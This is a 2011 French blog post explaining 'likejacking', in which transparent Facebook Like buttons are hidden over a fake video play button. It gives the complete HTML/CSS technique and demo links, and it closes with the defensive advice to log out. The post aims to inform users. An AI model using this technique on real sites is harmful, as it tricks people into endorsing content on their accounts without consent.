---
ID: 578
post_title: 'Comment voler des &laquo;&nbsp;Like&nbsp;&raquo; sur Facebook'
author: Jérémy Levallois
post_date: 2011-03-06 14:52:02
post_excerpt: ""
layout: post
permalink: >
  http://www.karganys.fr/programmation/php/comment-voler-des-like-sur-facebook/
published: true
tc-thumb-fld:
  - 'a:2:{s:9:"_thumb_id";b:0;s:11:"_thumb_type";s:10:"attachment";}'
---
<div class="wp-caption alignnone" style="width: 190px;"><a href="http://www.flickr.com/photos/tinaoable/5499176903/"><img src="http://farm6.static.flickr.com/5091/5499176903_0281b03e50_m.jpg" title="Thumbs up" alt="Thumbs up" width="180" height="240" /></a><p class="wp-caption-text"><a href="http://www.flickr.com/photos/tinaoable/5499176903/">Thumbs up</a> by <a href="http://www.flickr.com/photos/tinaoable/">TinaOable</a></p></div>

Avant toute chose, cet article à pour but <strong>d'informer</strong> les utilisateurs de Facebook des dangers que ce dernier laisse passer.

Vous avez regardé une vidéo qu'un de vos contacts à mis sur Facebook, et étrangement vous avez "aimé" la vidéo sans le vouloir ?
Je vais vous montrer comment vous pouvez très facilement voler des "Like" de vos liens sur Facebook.

Facebook autorise les développeurs web à utiliser un plugin social qui permet d’interagir, depuis un site extérieur, à votre compte Facebook.
Cela va du Bouton Like, aux commentaires directs utilisant votre véritable nom et prénom !

Maintenant, en utilisant une faille à ce système, il est possible de cacher aux visiteurs des boutons Like.
Pour se faire, il faut avec un zone où les utilisateurs devront cliquer, par exemple le bouton play d'une fausse vidéo. C'est cet exemple que je vais montrer.

<a href="http://www.karganys.fr/wp-content/uploads/2011/03/dontshowfacebooklikebutton.html">Cliquez ici pour voir l'exemple</a>. Si vous cliquez sur le boutons Play, vous pourrez voir sur votre compte Facebook que vous aimez la page http://www.karganys.fr/php/comment-voler-des-like-sur-facebook
<strong>Tant que vous ne cliquerez pas sur le bouton Play, il ne se passera rien sur votre compte Facebook, n'ayez pas peur :)</strong>

Regardons plus en détail le code source :

<pre lang="html4strict"><html>
	<head>
		<link rel="stylesheet" href="mycss.css" type="text/css">
	</link></head>
	<body>
		<div id="play_img">
			<div style="width:120px;height:115px;opacity:0">
				<div style="width:56px;height:115px;margin-left:7px;float:left">
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
				</div>

				<div style="width:57px;height:115px;float:left">
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
					<script src="http://connect.facebook.net/fr_FR/all.js#xfbml=1"></script><fb:like href="http://www.karganys.fr/php/comment-voler-des-like-sur-facebook" layout="button_count" show_faces="true" font="tahoma"></fb:like>
				</div>
			</div>
		</div>
	</body>
</html></pre>

et le css associé
<pre lang="css">#play_img{width:124px;height:111px;padding-top:4px;margin-left:248px;margin-top:135px;background:url('play.png') no-repeat top left}</pre>

Les balises script affichent un bouton Like avec en paramètre la page à aimer. Nous surchargeons l'image avec des boutons Like.
Ensuite, nous cachons toutes les images des boutons Like avec l'attribut CSS <strong>opacity:0</strong>, ce qui le rend "invisible" à l'œil, mais toujours présent.

<a href="http://www.karganys.fr/wp-content/uploads/2011/03/showfacebooklikebutton.html">Vous pouvez voir ici la même page</a>, mais sans l'attribut opacity

Cette faille est utilisée par quelques sites, comme AmbianceBuzz.net qui, soit dit en passant, averti en bas de sa page
<blockquote>Le bouton lecture de nos vidéos peut éventuellement partager notre vidéo à vos amis sur Facebook</blockquote>

Comment contourner ça ? Pour l'instant, la seule solution possible est de <strong>se déconnecter de Facebook dès lors que l'on ne l'utilise plus</strong>.
Ou encore mieux :<strong> Fermer son compte Facebook</strong> ...

Source : Code source d'AmbianceBuzz.net